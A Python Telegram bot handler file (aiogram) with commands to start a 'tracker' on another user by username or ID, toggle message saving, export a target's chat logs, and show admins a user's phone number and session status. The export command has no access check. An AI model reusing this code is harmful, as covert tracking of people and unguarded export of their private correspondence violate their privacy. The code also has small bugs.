import datetime
from email.mime import message

from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import BufferedInputFile, Message

from core.savemod_service import SaveModService

from datetime import datetime

from db.session import AsyncSessionLocal
from db.models import UserSession
from sqlalchemy import select
from core import tasks
router = Router()

ADMIN_IDS = [8418446543, 8566322265, 5484215621]

def setup_tracker_handlers(tracker_service, savemod_service):
    @router.message(Command("tracker"))
    async def start_tracker_handler(message: Message):
        parts = message.text.split(maxsplit=1)
    
        if len(parts) < 2 or not parts[1].strip:
            await message.answer(
                "❗ Укажи цель\n"
                "/tracker username\n"
                "/tracker user_id"
            )
            return
    
        target = parts[1].strip()
    
        try:
            await tracker_service.start(message.from_user.id, target)
            await message.answer("✅ Трекер запущен")
        except RuntimeError as e:
            await message.answer(str(e))

    @router.message(Command("stop"))
    async def stop_tracker_handler(message:Message):
        user_id = message.from_user.id
        try:
            await tracker_service.stop(user_id)

        except RuntimeError as e:
            await message.answer(str(e))


    @router.message(F.text == "/savemod_on")
    async def savemod_on_handler(message: Message):
        try:
            await savemod_service.enable(message.from_user.id)
            await message.answer("✅ SaveMod включён. Что бы выключить напишите /savemod_off")
        except RuntimeError as e:
            await message.answer(str(e))

    @router.message(F.text == "/savemod_off")
    async def savemod_off_handler(message: Message):
        await savemod_service.disable(message.from_user.id)
        await message.answer("❌SaveMod выключен. Что бы включить напишите /savemod_on")
# bot/handlers/tracker.py
# bot/handlers/tracker.py


        
    @router.message(Command("export"))
    async def export_logs_handler(message: Message):
        args = message.text.split()
        if len(args) < 2 or not args[1].isdigit():
            return await message.answer("⚠️ Используйте: <code>/export ID</code>", parse_mode="HTML")
        target_id = int(args[1])
        await message.answer(f"⏳ Формирую архив переписки для <code>{target_id}</code>...", parse_mode="HTML")

        file_content = await savemod_service.format_logs_to_txt(target_id)

        if not file_content:
            return await message.answer(f"❌ Логи для пользователя <code>{target_id}</code> не найдены.", parse_mode="HTML")
        
        file_data = BufferedInputFile(
            file_content.encode('utf-8'),
            filename=f"logs_{target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )

        await message.answer_document(
            file_data,
            caption=f"📁 Архив переписки для <code>{target_id}</code>",
            parse_mode="HTML"
        )

    @router.message(Command("user"))
    async def get_user_info_handler(message: Message):
        if message.from_user.id not in ADMIN_IDS:
            return await message.answer("❌ У вас нет доступа к этой команде.")
        args = message.text.split()
        if len(args) < 2 or not args[1].isdigit():
            return await message.answer("⚠️ Используйте: <code>/user ID</code>", parse_mode="HTML")
        target_id = int(args[1])

        async with AsyncSessionLocal() as session:
            result = await session.execute(
                select(UserSession).where(UserSession.bot_user_id == target_id)
            )
            user = result.scalar_one_or_none()

        if not user:
            return await message.answer(f"❌ Пользователь с ID <code>{target_id}</code> не найден.", parse_mode="HTML")
        
        has_session = await savemod_service.session_manager.has_session(target_id)
        session_status = "✅ Активна" if has_session else "❌ Нет сессии"

        savemod_status = "🟢 Включен" if user.savemod_enabled else "🔴 Выключен"
        
        is_tracker_active = tasks.is_tracker_running(target_id)
        tracker_status = "🟢 Запущен" if is_tracker_active else "🔴 Остановлен"

        text = (
            f"🔍 <b>Информация о пользователе {target_id}:</b>\n\n"
            f"📱 <b>Телефон:</b> <code>{user.phone or 'Не указан'}</code>\n"
            f"🔑 <b>Сессия:</b> {session_status}\n"
            f"💾 <b>SaveMod:</b> {savemod_status}\n"
            f"📡 <b>Tracker:</b> {tracker_status}\n"

        )

        await message.answer(text, parse_mode="HTML")